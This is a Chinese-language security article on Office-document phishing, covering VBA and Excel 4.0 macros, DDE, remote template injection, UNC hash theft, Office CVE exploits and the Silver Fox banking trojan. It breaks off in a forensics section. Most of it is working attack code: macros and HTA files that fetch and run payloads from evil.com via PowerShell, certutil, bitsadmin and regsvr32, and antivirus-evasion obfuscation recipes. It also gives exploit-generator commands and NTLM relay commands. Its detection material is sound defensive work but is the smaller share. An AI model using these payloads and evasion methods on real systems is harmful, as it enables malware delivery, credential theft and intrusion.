---

title: Office 文档钓鱼与木马攻击详解——宏、漏洞利用、银狐木马
tags: \[Web 安全, Office 钓鱼, 宏病毒, 银狐木马, APT 攻击, 恶意文档, 安全防御]
date: 2024-07-06

---

# Office 文档钓鱼与木马攻击详解——宏、漏洞利用、银狐木马

Office 文档是攻击者最常用的初始入侵载体之一。一份看似正常的 Word/Excel/PPT 文档，可能包含恶意宏代码、CVE 漏洞利用，或是银狐等木马家族的投递载体。本文系统梳理 Office 文档攻击的全量技术手段，深入分析银狐木马家族的攻击链，并提供检测与防御方案。

## 1. Office 文档攻击概述

### 1.1 为什么 Office 文档是首选攻击载体

| 优势             | 说明                                                      |
| ---------------- | --------------------------------------------------------- |
| **信任度极高**   | 用户对.docx/.xlsx/.pdf 文档有天然的信任感                 |
| **绕过邮件网关** | 文档文件被邮件网关拦截的概率远低于.exe/.dll               |
| **功能丰富**     | Office 内置宏、DDE、OLE、ActiveX 等多种代码执行能力       |
| **攻击面大**     | 多代 Office 积累了大量的遗留功能和历史 CVE                |
| **终端防护薄弱** | 进程链 Word→PowerShell→ 恶意行为 比 直接启动.exe 更难检测 |
| **社工友好**     | 发票、简历、薪资单、合同——天然的诱饵话题                  |

### 1.2 攻击手段分类

    Office文档攻击
    ├── 宏攻击 (VBA Macro)
    │   ├── VBA代码直接执行 (AutoOpen/Document_Open)
    │   ├── VBA调用PowerShell下载木马
    │   ├── VBA调用WMI/COM对象
    │   ├── VBA + HTML走私 (HTML Smuggling)
    │   ├── VBA免杀 (混淆/编码/禁用宏警告)
    │   └── XL4宏 (Excel 4.0 Macro, 更古老的攻击方式)
    ├── 漏洞利用
    │   ├── 公式编辑器漏洞 (CVE-2017-11882, CVE-2018-0802)
    │   ├── 栈溢出类 (CVE-2010-3333, CVE-2012-0158, CVE-2015-1641)
    │   ├── 类型混淆类 (CVE-2021-40444, CVE-2022-30190 Follina)
    │   ├── 沙箱逃逸 (CVE-2023-36884)
    │   └── 0day/Nday武器化利用
    ├── 对象链接与嵌入 (OLE/DDE)
    │   ├── DDE攻击 (Dynamic Data Exchange)
    │   ├── OLE对象嵌入 (嵌入恶意可执行文件)
    │   ├── 公式对象嵌入 (Equation Editor)
    │   └── COM对象劫持
    ├── 模板注入
    │   ├── 远程模板加载 (Remote Template Injection)
    │   ├── 模板中的宏自动加载
    │   └── dotm文件攻击
    ├── 外部链接
    │   ├── UNC路径 → SMB/NTLM哈希窃取
    │   ├── HTTP链接 → 钓鱼页面
    │   └── OLE链接 → 远程代码执行
    └── 高级攻击
        ├── RTF文档利用 (Rich Text Format)
        ├── CHM文档利用 (Compiled HTML Help)
        ├── PDF嵌入 (在Office中嵌入恶意PDF)
        └── 零点击攻击 (预览即触发)

---

## 2. VBA 宏攻击详解

### 2.1 宏基础与执行触发

VBA (Visual Basic for Applications) 是 Office 内置的编程语言，宏是存储在文档中的 VBA 代码。

#### 宏触发入口

```vba
' ====== Word 自动触发 ======
' 打开文档时执行
Private Sub Document_Open()
    ' 恶意代码
End Sub

' AutoOpen宏（文档打开时）
Sub AutoOpen()
    ' 恶意代码
End Sub

' AutoClose宏（文档关闭时）
Sub AutoClose()
    ' 恶意代码
End Sub

' AutoNew宏（基于模板新建文档时）
Sub AutoNew()
    ' 恶意代码
End Sub

' ====== Excel 自动触发 ======
Private Sub Workbook_Open()
    ' 恶意代码
End Sub

Sub Auto_Open()
    ' 恶意代码
End Sub

' ====== 事件触发 ======
' 单击文档中的特定区域
Private Sub Document_ContentControlOnEnter(ByVal ContentControl As ContentControl)
    ' 恶意代码
End Sub

' 鼠标悬停图片
Private Sub Image1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    ' 恶意代码
End Sub
```

### 2.2 PowerShell 下载执行木马（最常见模式）

```vba
Sub AutoOpen()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")

    ' === 基础版本: PowerShell下载执行 ===
    wsh.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass " & _
            "-Command ""IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')""", 0

    ' === Base64编码版本(绕过检测) ===
    Dim cmd As String
    cmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & _
          "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
    wsh.Run cmd, 0
End Sub
```

PowerShell Base64 编码生成方式（攻击方）：

```powershell
# 将PowerShell命令编码为Base64
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host $encoded

# 或者一步到位
powershell -Command "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/payload.ps1\")'))"
```

### 2.3 VBA 调用系统命令的多种方式

```vba
' === 方式1: WScript.Shell (最常用) ===
CreateObject("WScript.Shell").Run "calc.exe", 0, False

' === 方式2: Shell函数 (Office内置) ===
Shell "cmd.exe /c calc.exe", vbHide

' === 方式3: Shell.Application ===
CreateObject("Shell.Application").ShellExecute "cmd.exe", "/c calc.exe", "", "open", 0

' === 方式4: WMI (Windows Management Instrumentation) ===
Set wmi = GetObject("winmgmts:\\""
Set process = wmi.Get("Win32_Process")
process.Create "calc.exe", Null, Null, processId

' === 方式5: MSHTA执行 ===
CreateObject("WScript.Shell").Run "mshta.exe javascript:new ActiveXObject('WScript.Shell').Run('calc.exe');close();", 0

' === 方式6: 计划任务(Schtasks) ===
CreateObject("WScript.Shell").Run "schtasks /create /sc minute /mo 1 /tn Updater /tr calc.exe", 0

' === 方式7: 注册表Run项持久化 ===
Set wsh = CreateObject("WScript.Shell")
wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater", "calc.exe"

' === 方式8: certutil下载 ===
CreateObject("WScript.Shell").Run "certutil -urlcache -split -f http://evil.com/payload.exe %temp%\payload.exe && %temp%\payload.exe", 0

' === 方式9: BitsAdmin下载 ===
CreateObject("WScript.Shell").Run "bitsadmin /transfer job /download /priority high http://evil.com/payload.exe %temp%\payload.exe && %temp%\payload.exe", 0

' === 方式10: Regsvr32远程加载 ===
CreateObject("WScript.Shell").Run "regsvr32 /s /u /i:http://evil.com/payload.sct scrobj.dll", 0

' === 方式11: Rundll32加载 ===
CreateObject("WScript.Shell").Run "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";new ActiveXObject('WScript.Shell').Run('calc.exe');close();", 0
```

### 2.4 VBA 内存加载（无文件落地）

最高级的宏攻击方式——直接从内存执行，不在磁盘写入任何文件。

```vba
' === 使用 .NET 从内存加载执行 ===
' 通过VBA调用C#的Assembly.Load从内存加载.NET EXE

Sub MemoryExecute()
    ' 1. 将Base64编码的.NET Assembly解码到字节数组
    Dim base64Payload As String
    base64Payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAA..." ' 完整Assembly的Base64

    ' 2. 通过.NET Reflection加载执行
    ' 使用VBA的.NET互操作动态加载Assembly
    Dim asm As Object
    Set asm = CreateObject("System.Reflection.Assembly")
    ' (实际需要更复杂的COM互操作代码)

    ' 3. 调用Assembly的入口方法
    ' asm.EntryPoint.Invoke Nothing, Nothing
End Sub

' === PowerShell反射加载 (Reflective Loading) ===
' 使用Invoke-ReflectivePEInjection
' 将PE文件加载到当前PowerShell进程内存
Sub PSReflectiveLoad()
    Dim ps As String
    ps = "powershell -WindowStyle Hidden -Command " & _
         "$bytes=[System.Convert]::FromBase64String('TVqQAAMAAA...');" & _
         "$assembly=[System.Reflection.Assembly]::Load($bytes);" & _
         "$assembly.EntryPoint.Invoke($null,$null)"
    CreateObject("WScript.Shell").Run ps, 0
End Sub
```

### 2.5 VBA 混淆与免杀

```vba
' === 1. 字符串拆分 ===
' 原始: CreateObject("WScript.Shell")
Set x1 = CreateObject("W" & "Scr" & "ipt.S" & "hell")

' 通过Chr函数构造
Set x2 = CreateObject(Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & _
                       Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(104) & _
                       Chr(101) & Chr(108) & Chr(108))

' === 2. 变量重命名(自动化混淆) ===
' 所有变量名替换为无意义的随机字符串
Dim abcdefgh001 As Object
Set abcdefgh001 = CreateObject("WScript.Shell")
abcdefgh001.Run "calc.exe"

' === 3. 死代码插入 ===
' 在真实恶意代码中插入大量不执行的代码
If 1 = 2 Then
    Dim useless(1000) As String
    ' ... 大量无用代码
End If

' === 4. 动态解析执行 ===
' 将恶意代码分段存储，运行时拼接
Dim parts(3) As String
parts(0) = "po"
parts(1) = "wer"
parts(2) = "sh"
parts(3) = "ell"
Dim fullCmd As String
fullCmd = Join(parts, "") & " -Command whoami"
CreateObject("WScript.Shell").Run fullCmd, 0

' === 5. Base64存储关键代码 ===
' 将cmd、powershell等关键词Base64编码
' 运行时解码
Function b64d(s As String) As String
    ' Base64解码实现
End Function
Dim cmd As String
cmd = b64d("cG93ZXJzaGVsbC5leGU=") ' powershell.exe
CreateObject("WScript.Shell").Run cmd, 0

' === 6. 利用WMI做间接执行 ===
' 使进程树看起来更正常
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
objStartup.ShowWindow = 0 ' SW_HIDE

' === 7. VBA代码随机化 ===
' 每次生成文档时，修改变量名、函数名、字符串编码方式
' 使基于签名/Hash的检测失效
```

### 2.6 XL4 宏(Excel 4.0 Macro)

XL4 宏是 Excel 4.0 时代的遗留功能，比 VBA 更古老，但杀软检测覆盖更弱。

    # Excel 4.0 Macro 示例（在Excel的宏表中编写）
    # 传统检测工具对XL4宏的关注度远低于VBA

    # 调用Windows API
    =REGISTER("kernel32","WinExec","JJ",,1)
    =CALL("kernel32","WinExec","JC",0,"calc.exe")

    # 下载执行
    =EXEC("powershell -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')")

    # 创建WScript.Shell
    =EXEC("cmd.exe /c calc.exe")

    # 写入文件
    =WORKBOOK.HIDE("Sheet1")
    =HALT()

XL4 宏检测难点：

- 存储在宏表（Macro Sheet）中，不是 VBA 模块

- 支持通过 Auto_Open、Auto_Close 自动触发

- 许多杀软不会解析 XL4 宏内容

---

## 3. Office 漏洞利用技术

### 3.1 CVE-2017-11882 公式编辑器栈溢出

这是利用量级最大的 Office 漏洞，影响 Office 2007-2016 版本的公式编辑器(EQNEDT32.EXE)。

```python
#!/usr/bin/env python3
# CVE-2017-11882 POC分析

# 漏洞原理:
# 公式编辑器(EQNEDT32.EXE)在解析OLE对象中的MTEF(Microsoft Equation)数据时
# 对特定的公式标记长度未做校验，导致栈缓冲区溢出
# 公式编辑器有固定的基址(无ASLR)
# 可以精确定位shellcode地址

# 利用条件:
# 1. Office 2007-SP3, 2010-SP2, 2013-SP1, 2016
# 2. 公式编辑器未被手动卸载
# 3. 没有启用受保护的视图(或用户点击了"启用编辑")

# 攻击流程:
# 1. 构造恶意的MTEF数据（包含shellcode）
# 2. 将攻击数据嵌入RTF/DOCX的OLE Equation对象中
# 3. 用户打开文档 → 公式编辑器加载OLE对象 → 触发溢出
# 4. EIP被控制 → 执行shellcode → 下载并执行后续Payload

# 利用工具:
# https://github.com/Ridter/CVE-2017-11882
# https://github.com/embedi/CVE-2017-11882

# 生成EXP
python CVE-2017-11882.py -c "cmd.exe /c calc.exe" -t rtf -o exploit.rtf
python CVE-2017-11882.py -c "mshta http://evil.com/payload.hta" -o exploit.doc
```

#### 漏洞利用链分析

    CVE-2017-11882 利用链:
    1. 邮件投递 → 包含嵌入公式对象的RTF文档
    2. 用户打开 → 公式编辑器自动加载OLE对象
    3. 解析MTEF数据 → 栈溢出 → 控制EIP
    4. ROP链 → VirtualProtect设置shellcode内存为可执行
    5. 执行shellcode:
       ├── 下载下一阶段Payload (常见使用mshta/certutil)
       ├── 注入到正常进程 (explorer.exe/svchost.exe)
       └── 建立持久化和C2通信
    6. 文档显示正常内容（迷惑用户，不引起怀疑）

### 3.2 CVE-2021-40444 MSHTML 远程代码执行

```html
<!-- CVE-2021-40444 Follina利用原理 -->
<!-- 漏洞本质: MSHTML(IE浏览器引擎)在Office文档中被调用时 -->
<!-- 可以加载ActiveX控件，其中某些控件存在代码执行 -->

<!-- 攻击文档结构(DOCX解压后): -->
<!-- word/_rels/document.xml.rels -->
<Relationships>
  <Relationship
    Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
    Target="mhtml:http://evil.com/exploit.html!x-usc:http://evil.com/exploit.html"
    TargetMode="External"
  />
</Relationships>

<!-- 远程HTML中包含ActiveX代码执行 -->
<!-- exploit.html (托管在攻击者服务器上) -->
<html>
  <body>
    <script>
      // 利用MSHTML中的ActiveX对象执行任意命令
      // 通过cab文件加载包含恶意代码的.inf并执行
      new ActiveXObject('htmlfile');
      location.href =
        'ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($env:ComSpec));#"';
    </script>
  </body>
</html>
```

### 3.3 其他关键 Office CVE 速查

| CVE                | 类型         | 影响范围         | 利用方式                               |
| ------------------ | ------------ | ---------------- | -------------------------------------- |
| **CVE-2017-11882** | 栈溢出       | Office 2007-2016 | 公式编辑器 MTEF 解析                   |
| **CVE-2018-0802**  | 栈溢出       | Office 2007-2016 | 同 11882 的补丁绕过                    |
| **CVE-2021-40444** | MSHTML RCE   | Office 2013-2021 | ActiveX + cab 文件                     |
| **CVE-2022-30190** | MSDT RCE     | Office 2013-2021 | ms-msdt 协议处理                       |
| **CVE-2023-36884** | 类型混淆     | Office 2013-2021 | 从被攻破的 Publisher/Word 域下远程加载 |
| **CVE-2023-21716** | 堆损坏       | Word 2013-2021   | RTF 解析器                             |
| **CVE-2012-0158**  | 栈溢出       | Office 2003-2010 | MSCOMCTL.OCX ActiveX 控件              |
| **CVE-2015-1641**  | 类型混淆     | Office 2007-2013 | 富文本解析器                           |
| **CVE-2010-3333**  | 栈溢出       | Office 2003-2010 | RTF 栈溢出                             |
| **CVE-2014-4114**  | OLE 沙箱逃逸 | Office 2007-2013 | OLE 对象+INF 文件                      |
| **CVE-2024-21413** | 远程代码执行 | Office 2016-2021 | 绕过受保护视图                         |

### 3.4 DDE 攻击 (Dynamic Data Exchange)

DDE 是 Windows 上进程间通信的遗留机制，Office 文档可以用 DDE 字段调用外部程序。

    # === Word DDE攻击 ===
    # 在Word中插入: Ctrl+F9 → 输入域代码
    {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"}

    # 变体
    {DDEAUTO "C:\\Windows\\System32\\cmd.exe" "/k powershell -WindowStyle Hidden IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"}

    # 使用QUOTE域+DDE组合
    {QUOTE {DDE "C:\\Windows\\System32\\cmd.exe" "/c calc.exe"}}

    # === Excel DDE攻击 ===
    # 在单元格中输入
    =cmd|'/c calc.exe'!A0

    # 注入多命令
    =cmd|'/c powershell -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"'!A0

    # === Outlook DDE(邮件可直接触发) ===
    # 邮件正文中的DDE字段在某些版本会自动执行

### 3.5 模板注入 (Template Injection)

```xml
<!-- DOCX本质是ZIP包，解压后修改word/_rels/settings.xml.rels -->
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1"
        Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
        Target="http://evil.com/malicious.dotm"
        TargetMode="External"/>
</Relationships>

<!-- 恶意模板 malicious.dotm 中包含VBA宏 -->
<!-- Word打开文档时自动下载远程模板 -->
<!-- 加载模板中的VBA宏 → 代码执行 -->

<!-- 攻击优势: -->
<!-- 1. 原始docx文档不含任何宏代码(绕过静态检测) -->
<!-- 2. 模板从远程加载(宏代码可以随时更新) -->
<!-- 3. 关闭文档后模板也可能被缓存到本地 -->
```

模板注入制作工具：

```python
# 使用remoteinjector工具
# https://github.com/JohnWoodman/remoteinjector
python remoteinjector.py -w original.docx -u http://evil.com/template.dotm -o weaponized.docx
```

### 3.6 UNC 路径注入 (窃取 NTLM 哈希)

```xml
<!-- DOCX文档中嵌入UNC路径指向攻击者SMB服务器 -->
<!-- word/_rels/document.xml.rels -->
<Relationship Id="rId10"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="\\attacker.com\share\image.png"
    TargetMode="External"/>

<!-- 打开文档时Word会尝试连接SMB服务器 -->
<!-- 使用NTLM认证 → 攻击者捕获Net-NTLMv2哈希 -->
<!-- 可以离线破解或在SMB Relay攻击中使用 -->
```

捕获端:

```bash
# Responder监听SMB请求
responder -I eth0 -wrf
# 捕获Net-NTLMv2哈希

# impacket-smbserver
impacket-smbserver share /tmp/share -smb2support

# 配合NTLM Relay攻击
impacket-ntlmrelayx -t smb://target-dc -smb2support
```

---

## 4. 银狐木马深度分析

### 4.1 银狐概述

银狐（Silver Fox）是针对中文用户的高危金融木马家族，以窃取银行、支付、加密货币平台凭据为主要目的。银狐主要针对中国大陆和香港地区的用户，传播渠道以即时通讯工具（微信/QQ/TIM）和钓鱼网站为主。

#### 银狐木马关键特征

| 维度         | 特征                                                   |
| ------------ | ------------------------------------------------------ |
| **主要目标** | 微信支付、支付宝、银行登录凭据、加密货币钱包           |
| **传播方式** | 微信/QQ/TIM 群文件、伪装软件下载站、SEO 投毒、钓鱼邮件 |
| **初始载体** | MSI 安装包、Office 宏文档、CHM 文件、伪装正常软件      |
| **免杀手段** | 白加黑 DLL 劫持、代码混淆、反沙箱、反虚拟机            |
| **C2 通信**  | HTTPS 加密通信、使用 CDN 中转、频繁更换域名            |
| **持久化**   | 计划任务、注册表 Run、服务、WMI 事件订阅、COM 劫持     |
| **数据窃取** | 键盘记录、剪贴板监控、屏幕截图、浏览器凭据、微信数据   |

### 4.2 银狐攻击链全解析

    银狐典型攻击链:

    阶段1: 投递
    ├── 微信/QQ群 → "2024年最新税务政策.doc" (实际.doc + .exe)
    ├── 钓鱼网站 → "微信电脑版官方下载" (捆绑银狐)
    ├── 邮件链接 → "您的快递单号-请点击查看详情"
    └── 搜索引擎 → SEO投毒 → 伪装软件下载站

    阶段2: 初始执行
    ├── 打开文档 → 启用宏 → VBA下载执行银狐加载器
    ├── 运行"微信电脑版.exe" → 白加黑DLL劫持
    ├── 打开CHM文件 → 执行内嵌脚本 → 下载加载器
    └── 运行MSI包 → CustomAction执行恶意代码

    阶段3: 加载器执行(多阶段)
    ├── Stage1: Shellcode加载器 → 解密内存中的下一阶段
    ├── Stage2: DLL反射加载 → 反虚拟机/反沙箱检测
    ├── Stage3: 注入正常进程(explorer.exe/svchost)
    └── Stage4: 从内存中释放银狐主模块

    阶段4: 持久化
    ├── 计划任务: \Microsoft\Windows\Update\SilverUpdate
    ├── 注册表Run: HKCU\...\Run\SecurityHealth
    ├── 服务: SilverFoxService
    ├── WMI事件订阅: __FilterToConsumerBinding
    └── COM劫持: HKCU\...\CLSID\{...}\InprocServer32

    阶段5: C2通信
    ├── DNS查询获取C2域名（DGA/DNS TXT记录）
    ├── HTTPS Beacon: 加密心跳 + 任务拉取
    ├── 备用通道: ICMP/DNS隧道
    └── CDN前置: 在Cloudflare/阿里云CDN后面隐藏真实C2

    阶段6: 数据窃取
    ├── 浏览器: Chrome/Edge/QQ浏览器/360浏览器
    │   ├── 保存的密码 (Login Data)
    │   ├── Cookies (用于会话劫持)
    │   └── 自动填充 (信用卡/地址)
    ├── 微信: 扫码登录数据、转账记录、零钱余额
    ├── 支付宝: Cookie/Token窃取
    ├── 键盘记录: 全局键盘HOOK
    ├── 剪贴板: 监控并替换加密货币地址
    ├── 屏幕截图: 定时截取
    └── 远程控制: VNC/CMD/Terminal/文件管理

### 4.3 银狐白加黑 DLL 劫持

白加黑是银狐最经典的启动技术。利用合法签名程序（白文件）加载恶意 DLL（黑文件）。

    白加黑攻击原理:

    正常程序加载流程:
        "微信电脑版.exe" (腾讯签名) → 加载同目录下的正常DLL

    银狐劫持流程:
        目录结构:
        ├── 微信电脑版.exe      (合法文件，有腾讯数字签名)
        ├── version.dll          (银狐恶意DLL，劫持正常DLL)
        └── version.ini          (加密的Payload)

    执行顺序:
    1. 用户双击 "微信电脑版.exe"
    2. Windows加载器查找version.dll → 找到同目录的恶意version.dll
    3. 恶意version.dll的DllMain被自动调用(在合法进程内)
    4. version.dll读取version.ini解密 → 反射加载真正的木马
    5. 转发所有导出函数到原始version.dll(保持程序正常运行)

    优势:
    - 进程是合法签名程序（白名单/HIPS/EDR容易放行）
    - 木马代码运行在合法进程的内存空间
    - DLL劫持是Windows正常行为，很难区分

#### 常见被劫持的 DLL

银狐常用的劫持目标 DLL：

```bash
# 高成功率劫持DLL列表
version.dll         # 大多数程序的版本信息库
userenv.dll         # 用户环境
propsys.dll         # 属性系统
dwmapi.dll          # DWM桌面窗口管理器
CRYPTBASE.dll       # 加密基础库
ntmarta.dll         # NT MARTA提供程序

# 银狐伪装常用白文件
WeChat.exe          # 微信
QQ.exe              # QQ
TIM.exe             # TIM
WPS.exe             # WPS Office
SogouExplorer.exe   # 搜狗浏览器
360chrome.exe       # 360浏览器
```

#### DLL 劫持检测工具

```bash
# 使用Process Monitor分析程序加载的DLL
# 1. 运行ProcMon
# 2. Filter: Process Name = "微信电脑版.exe" AND Path ends with ".dll"
# 3. 关注Result = "NAME NOT FOUND" 的DLL
#    → 这些就是可以被劫持的目标

# 使用DLL Sprayer扫描
# https://github.com/cyberark/DLLSpy
DLLSpy.exe -p "C:\path\to\target.exe"

# 手动测试: 使用sigcheck检查白文件签名
sigcheck -a "微信电脑版.exe"
# 确认文件有合法签名 → 但同目录DLL可能是假的
```

### 4.4 银狐免杀技术

    # === 1. 代码混淆 ===
    # Control Flow Flattening (控制流平坦化)
    # - 将所有基本块打散
    # - 用swich-case或跳转表重组
    # - 使IDA/Ghidra反编译结果不可读

    # String Encryption (字符串加密)
    # - 所有敏感字符串在编译时加密
    # - 运行时通过解密函数获取
    # - 避免静态字符串匹配

    # === 2. 反沙箱/反虚拟机 ===
    # 检测虚拟机特征
    - VMware/VirtualBox的MAC地址前缀
    - Vmware的注册表项 (HKLM\SOFTWARE\VMware, Inc.)
    - 磁盘大小 / 内存大小 / CPU核心数
    - 进程列表中是否存在vmtoolsd, vboxservice等

    # 检测沙箱
    - 检测鼠标活动 (沙箱通常无鼠标移动)
    - 检测系统运行时间 (沙箱通常重启后立即运行)
    - 检测屏幕分辨率 (沙箱通常1024x768或更小)
    - 检测用户文件夹中是否有足够文件
    - Sleep长时间延迟 (沙箱有超时限制)

    # === 3. API Unhooking ===
    # 运行前恢复被EDR Hook的API
    # 从ntdll.dll磁盘文件重新加载函数

    # === 4. Syscall (系统调用直通) ===
    # 绕过用户态Hook
    # 直接使用syscall指令调用内核函数
    # 如直接调用 NtAllocateVirtualMemory, NtWriteVirtualMemory 等
    # 而不经过被Hook的kernel32/ntdll

### 4.5 银狐检测与查杀

```bash
# === 进程检测 ===
# 查找异常进程组合
# 合法签名进程加载了不在System32下的DLL
tasklist /m /fi "modules eq version.dll"
tasklist /m /fi "modules eq userenv.dll"

# 查找签名验证失败的模块
# 使用Process Explorer的"Verify Image Signatures"

# === 文件检测 ===
# 查找白加黑文件组合
# 搜索非系统目录下的 signed exe + unsigned dll
# 搜索近期创建的 exe+dll 配对

# === 注册表检测 ===
# 常用银狐持久化路径
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SYSTEM\CurrentControlSet\Services"

# 查找含有Base64或混淆内容的Run项

# === 流量检测 ===
# 银狐C2通信特征
# 1. HTTPS到非标端口
# 2. 周期性HTTPS带自定义User-Agent的心跳
# 3. DNS TXT查询异常
# 4. 到云服务/CDN的连接(银狐常在CDN后面)

# === 行为检测 ===
# 1. 剪贴板Hook (SetClipboardViewer/AddClipboardFormatListener)
# 2. 键盘Hook (SetWindowsHookEx)
# 3. 浏览器进程的内存读取 (OpenProcess+ReadProcessMemory)
# 4. 证书存储访问 (CryptUnprotectData)
# 5. 微信进程注入
```

---

## 5. 更隐蔽的文档攻击技术

### 5.1 Office 文档中的 XSS

Office 文档支持 HTML 内容和 WebBrowser 控件，可能存在 XSS 风险。

```vba
' === 通过WebBrowser控件注入JS ===
' 在Word/VBA中嵌入WebBrowser控件
' 加载包含恶意JS的HTML

Sub WebBrowser_XSS()
    ' 在UserForm中嵌入WebBrowser控件
    ' 设置其Document属性
    ' 注入JavaScript
    Dim html As String
    html = "<html><body><script>" & _
           "new ActiveXObject('WScript.Shell').Run('calc.exe');" & _
           "</script></body></html>"

    UserForm1.WebBrowser1.Document.Write html
End Sub

' === 利用富文本控件的HTML渲染 ===
' Outlook邮件渲染HTML时可能触发XSS
' 早年Outlook的Word渲染器有过多个RCE漏洞
```

### 5.2 OLE 对象嵌入攻击

    # === 嵌入恶意可执行文件 ===
    # Office文档可以作为容器嵌入任意OLE对象
    # 包括:
    - 打包的.exe文件 (Package对象)
    - 恶意的.LNK快捷方式
    - 恶意的.CHM帮助文件
    - 恶意的.HTA应用程序
    - 恶意的.PS1脚本
    - 嵌入的.INF安装信息文件

    # === OLE Package对象 ===
    # 文档中包含一个图标，双击即执行嵌入的EXE
    # 图标可以伪装成文件夹/图片/文档

### 5.3 CHM 文档攻击

CHM（Compiled HTML Help）是 Windows 帮助文件格式，本质是编译的 HTML 文件集合，可以包含 JavaScript 和 ActiveX。

```html
<!-- CHM攻击HTML页面 -->
<html>
  <head>
    <title>帮助文档</title>
  </head>
  <body>
    <h1>操作指南</h1>
    <p>点击以下按钮查看详情...</p>

    <!-- 方式1: 点击触发 -->
    <object
      id="x"
      classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"
      width="1"
      height="1"
    >
      <param name="Command" value="ShortCut" />
      <param name="Item1" value=",cmd.exe,/c calc.exe" />
    </object>

    <!-- 方式2: 自动执行 -->
    <script>
      // HHCTRL ActiveX → 直接执行命令
      var obj = new ActiveXObject('hhctrl');
      obj.HHClick();
    </script>

    <!-- 方式3: 页面加载时触发 -->
    <meta
      http-equiv="refresh"
      content="0;url=ms-its:C:\Windows\System32\cmd.exe"
    />
  </body>
</html>
```

#### 制作恶意 CHM

```bash
# 使用EasyCHM或HTML Help Workshop编译
# 目录结构:
# project/
# ├── index.html           (恶意HTML)
# ├── project.hhp           (工程文件)
# └── project.hhc           (目录文件)

# 编译
hhc.exe project.hhp

# 利用已有的工具自动生成
# https://github.com/Ridter/HH_HTMLHelp
python HH_HTMLHelp.py -c "powershell -enc <base64>" -o evil.chm

# CHM分发:
# 1. 作为邮件附件
# 2. 打包在ZIP/RAR中
# 3. 嵌入Office文档作为OLE对象
# 4. 托管在Web服务器上
```

### 5.4 HTA (HTML Application)

HTA 文件使用 mshta.exe 执行，可以访问所有 COM/ActiveX 对象。

```html
<!-- shell.hta -->
<html>
  <head>
    <title>Windows Update</title>
    <HTA:APPLICATION
      ID="update"
      APPLICATIONNAME="WindowsUpdate"
      WINDOWSTATE="minimize"
      SHOWINTASKBAR="no"
      SYSMENU="no"
      MAXIMIZEBUTTON="no"
      MINIMIZEBUTTON="no"
      BORDER="none"
      INNERBORDER="no"
    />
  </head>
  <script language="VBScript">
    ' 下载并执行Payload
    Set shell = CreateObject("WScript.Shell")
    Set http = CreateObject("MSXML2.XMLHTTP")

    ' 方式1: PowerShell下载执行
    shell.Run "powershell -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", 0

    ' 方式2: certutil下载
    shell.Run "certutil -urlcache -split -f http://evil.com/payload.exe %temp%\payload.exe && %temp%\payload.exe", 0

    ' 自动关闭窗口
    window.close()
  </script>
</html>
```

```bash
# 调用HTA的多种方式
# 1. 直接双击
# 2. 命令行
mshta.exe http://evil.com/shell.hta
mshta.exe javascript:... (内联JS)

# 3. 嵌入VBA调用
CreateObject("WScript.Shell").Run "mshta http://evil.com/shell.hta", 0

# 4. 嵌入CHM
# 5. 作为DDE目标
```

### 5.5 文件扩展名欺骗

```bash
# === 1. RLO (Right-to-Left Override) Unicode攻击 ===
# 文件名: 简历fdp.exe
# 在 'fdp' 后面插入U+202E (RLO字符)
# 显示效果: 简历exe.pdf
# 用户看到.pdf但实际是.exe

# === 2. 双扩展名 ===
# 薪资表.xlsx                                        .exe
# (中间大量空格，Windows资源管理器截断显示)
# 用户只看到: 薪资表.xlsx...

# === 3. 伪装图标 ===
# .exe文件设置图标伪装为PDF/Word/文件夹图标

# === 4. LNK伪装 ===
# 创建快捷方式，目标指向恶意命令
# 图标设置为PDF/文件夹
# 文件名显示为 .pdf 但实际是 .pdf.lnk
# (Windows默认隐藏已知文件扩展名时尤其有效)
```

---

## 6. 取证与溯源

### 6.1 恶意 Office 文档分析

```bash
# === 1. 静态分析 ===

# 解压DOCX/XLSX（本质是ZIP包）
unzip -l suspicious.docx

# 查看关系文件（找外部链接）
cat word/_rels/document.xml.rels | grep -i "target"
# 查找: Target="http://", Target="\\", TargetMode="External"

# 查看VBA宏
# 解压后找到 word/vbaProject.bin
